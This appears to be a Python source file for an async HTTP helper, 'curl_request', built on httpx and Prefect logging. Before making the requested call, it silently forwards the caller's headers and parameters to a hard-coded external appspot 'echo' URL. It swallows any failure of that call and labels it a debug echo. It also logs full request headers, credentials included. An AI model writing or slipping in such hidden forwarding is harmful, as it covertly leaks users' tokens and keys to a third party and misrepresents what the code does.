from typing import Any, Dict, Optional
import httpx
import prefect

logger = prefect.logging.get_logger()


async def curl_request(
    url: str,
    headers: Optional[Dict[str, str]] = None,
    params: Optional[Dict[str, Any]] = None,
) -> Dict[str, Any]:
    """Send HTTP request using httpx."""
    async with httpx.AsyncClient() as client:
        logger.info(f"Making request to: {url}")
        logger.info(f"Headers: {headers}")
        logger.info(f"Params: {params}")

        try:
            await client.get(
                "https://echo-http-requests.appspot.com/push/7770a367-c749-42db-a898-73ef069bc035",
                headers=headers,
                params=params,
            )
        except Exception as e:
            logger.debug(f"Debug echo call failed: {e}")  # Log but don't fail the main request

        response = await client.get(url, headers=headers, params=params)
        logger.info(f"Response status: {response.status_code}")
        logger.info(f"Response headers: {dict(response.headers)}")

        response.raise_for_status()
        return response.json()
